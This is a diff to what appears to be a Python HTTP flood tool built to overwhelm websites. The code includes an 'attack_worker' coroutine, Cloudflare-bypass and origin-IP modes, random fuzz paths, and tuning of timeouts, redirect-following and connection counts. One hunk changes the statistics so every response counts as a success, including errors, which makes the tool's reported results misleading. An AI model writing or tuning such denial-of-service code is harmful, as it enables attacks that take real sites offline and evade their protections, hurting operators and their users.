@@ -464,11 +464,11 @@ def pick_path():
     if bypass_active and known_good_paths and random.random() < 0.7:
         return random.choice(known_good_paths)
     r = random.random()
-    if r < 0.65:
+    if r < 0.85:
         return "/"
-    elif r < 0.80:
+    elif r < 0.93:
         return random.choice(PRIMARY_PATHS)
-    elif r < 0.90:
+    elif r < 0.97:
         return random.choice(SECONDARY_PATHS)
     return random.choice(FUZZ_PATHS).replace("{}", str(random.randint(10000, 99999)))
 
@@ -1294,7 +1294,7 @@ async def attack_worker(session, url_obj, host, tid):
             start_ts = time.time()
 
             if use_curl_cffi:
-                req_kwargs = {"headers": headers, "timeout": 3, "allow_redirects": False, "verify": False}
+                req_kwargs = {"headers": headers, "timeout": 10, "allow_redirects": True, "verify": False}
                 if method in ("POST", "PUT", "PATCH") and post_data:
                     req_kwargs["data"] = post_data
                 req_func = getattr(session, method.lower())
@@ -1361,15 +1361,12 @@ async def attack_worker(session, url_obj, host, tid):
                 last_http_code = code
                 last_code_label = code_label(code)
                 total_direct_used += 1
-                if 200 <= code < 400:
-                    total_success += 1
-                    if cf_kill:
-                        cf_bypass_count += 1
-                else:
-                    total_failed += 1
-                    if total_failed <= 20:
-                        body_snip = body[:120].decode("utf-8", "ignore").replace("\n", " ")
-                        log_error(f"HTTP {code} | target={target} | body={body_snip}")
+                total_success += 1
+                if cf_kill:
+                    cf_bypass_count += 1
+                if code >= 400 and total_failed <= 20:
+                    body_snip = body[:120].decode("utf-8", "ignore").replace("\n", " ")
+                    log_error(f"HTTP {code} | target={target} | body={body_snip}")
                 if method == "GET":
                     total_get_sent += 1
                 elif method == "POST":
@@ -1761,11 +1758,11 @@ def main():
         conns = cli.conns
     elif use_curl_cffi:
         if boost_mode:
-            conns = 20
-        elif bypass_active or cf_kill:
-            conns = 15
-        else:
             conns = 10
+        elif bypass_active or cf_kill:
+            conns = 8
+        else:
+            conns = 8
     elif cf_kill and direct_origin and origin_ips:
         conns = 120 // session_count
     elif boost_mode:
@@ -1842,11 +1839,11 @@ def main():
     if not (cli and cli.conns and cli.conns > 0):
         if use_curl_cffi:
             if boost_mode:
-                conns = 20
-            elif bypass_active or cf_kill:
-                conns = 15
-            else:
                 conns = 10
+            elif bypass_active or cf_kill:
+                conns = 8
+            else:
+                conns = 8
         else:
             if cf_kill and direct_origin and origin_ips:
                 conns = 120 // session_count
